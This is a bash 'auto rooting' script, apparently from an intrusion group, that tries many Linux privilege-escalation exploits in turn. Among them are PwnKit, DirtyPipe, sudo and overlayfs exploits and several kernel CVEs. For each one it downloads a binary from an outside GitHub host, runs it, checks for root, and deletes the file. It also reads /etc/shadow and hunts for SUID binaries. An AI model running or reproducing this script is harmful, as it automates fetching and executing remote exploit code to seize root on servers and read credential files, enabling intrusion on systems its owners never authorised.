#!/bin/bash

RED='\033[96m'
ENDCOLOR='\033[0m'

echo "***************************************************************"
echo -e "${CYAN}Auto Rooting Server By: TegalXploiter${ENDCOLOR}"
echo -e "${CYAN}Team: Leviathan Perfect Hunter${ENDCOLOR}"
echo "***************************************************************"

check_root() {
    if [ "$(id -u)" -eq 0 ]; then
        echo
        echo "Successfully Get Root Access"
        echo "ID     => $(id -u)"
        echo "WHOAMI => $USER"
        echo
        exit
    fi
}

check_pkexec_version() {
    output=$(pkexec --version)
    version=""
    while IFS= read -r line; do
        if [[ $line == *"pkexec version"* ]]; then
            version=$(echo "$line" | awk '{print $NF}')
            break
        fi
    done <<< "$output"
    echo "$version"
}

run_commands_with_pkexec() {
    pkexec_version=$(check_pkexec_version)
    echo "pkexec version: $pkexec_version"

    if [[ $pkexec_version == "1.05" || $pkexec_version == "0.96" || $pkexec_version == "0.95" || $pkexec_version == "105" ]]; then
        wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/exp_file_credential" --no-check-certificate
        chmod 777 exp_file_credential
        ./exp_file_credential
        check_root
        rm -f exp_file_credential
        rm -rf exp_dir
    else
        echo "pkexec not supported"
    fi
}

run_commands_with_pkexec

# pwnkit / pkexec
wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/PwnKit" --no-check-certificate
chmod 777 PwnKit
./PwnKit
check_root
rm -f PwnKit
rm -rf GCONV_PATH=.
rm -rf .pkexec

# ptrace
wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/ptrace" --no-check-certificate
chmod 777 ptrace
./ptrace
check_root
rm -f ptrace

# CVE-2022-0847-DirtyPipe-Exploits
wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/CVE-2022-0847-DirtyPipe-Exploits/exploit-1" --no-check-certificate
wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/CVE-2022-0847-DirtyPipe-Exploits/exploit-2" --no-check-certificate
chmod 777 exploit-1
chmod 777 exploit-2
./exploit-1
./exploit-2 SUID
check_root
rm -f exploit-1
rm -f exploit-2

# lupa:v
wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/CVE-2022-0847-DirtyPipe-Exploits/a2.out" --no-check-certificate
chmod 777 a2.out
find / -perm 4000 -type -f 2>/dev/null || find / -perm -u=s -type -f 2>/dev/null
./a2.out /usr/bin/sudo
check_root
./a2.out /usr/bin/passwd
check_root
rm -f a2.out

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/sudodirtypipe" --no-check-certificate
chmod 777 "sudodirtypipe"
./sudodirtypipe /usr/local/bin
check_root
rm "sudodirtypipe"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/af_packet" --no-check-certificate
chmod 777 "af_packet"
./af_packet
check_root
rm "af_packet"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/CVE-2015-1328" --no-check-certificate
chmod 777 "CVE-2015-1328"
./CVE-2015-1328
check_root
rm "CVE-2015-1328"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/cve-2017-16995" --no-check-certificate
chmod 777 "cve-2017-16995"
./cve-2017-16995
check_root
rm "cve-2017-16995"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/exploit-debian" --no-check-certificate
chmod 777 "exploit-debian"
./exploit-debian
check_root
rm "exploit-debian"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/exploit-ubuntu" --no-check-certificate
chmod 777 "exploit-ubuntu"
./exploit-ubuntu
check_root
rm "exploit-ubuntu"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/newpid" --no-check-certificate
chmod 777 "newpid"
./newpid
check_root
rm "newpid"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/raceabrt" --no-check-certificate
chmod 777 "raceabrt"
./raceabrt
check_root
rm "raceabrt"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/timeoutpwn" --no-check-certificate
chmod 777 "timeoutpwn"
./timeoutpwn
check_root
rm "timeoutpwn"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/upstream44" --no-check-certificate
chmod 777 "upstream44"
./upstream44
check_root
rm "upstream44"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/lpe.sh" --no-check-certificate
chmod 777 "lpe.sh"
head -2 /etc/shadow
./lpe.sh
check_root
rm "lpe.sh"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/a.out" --no-check-certificate
chmod 777 "a.out"
./a.out 0 && ./a.out 1
check_root
rm "a.out"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/linux_sudo_cve-2017-1000367" --no-check-certificate
chmod 777 "linux_sudo_cve-2017-1000367"
./linux_sudo_cve-2017-1000367
check_root
rm "linux_sudo_cve-2017-1000367"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/overlayfs" --no-check-certificate
chmod 777 "overlayfs"
./overlayfs
check_root
rm "overlayfs"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/CVE-2017-7308" --no-check-certificate
chmod 777 "CVE-2017-7308"
./CVE-2017-7308
check_root
rm "CVE-2017-7308"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/CVE-2022-2639" --no-check-certificate
chmod 777 "CVE-2022-2639"
./CVE-2022-2639
check_root
rm "CVE-2022-2639"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/polkit-pwnage" --no-check-certificate
chmod 777 "polkit-pwnage"
./polkit-pwnage
check_root
rm "polkit-pwnage"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/RationalLove" --no-check-certificate
chmod 777 "RationalLove"
./RationalLove
check_root
rm "RationalLove"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/exploit_userspec.py" --no-check-certificate
chmod 777 "exploit_userspec.py"
python2 exploit_userspec.py
check_root
rm "exploit_userspec.py"
rm "0"
rm "kmem"
rm "sendfile1"

wget -q "https://raw.githubusercontent.com/oxygencall/Linux/main/exp_file_credential" --no-check-certificate
chmod 777 exp_file_credential
./exp_file_credential
check_root
rm -f exp_file_credential
rm -rf exp_dir
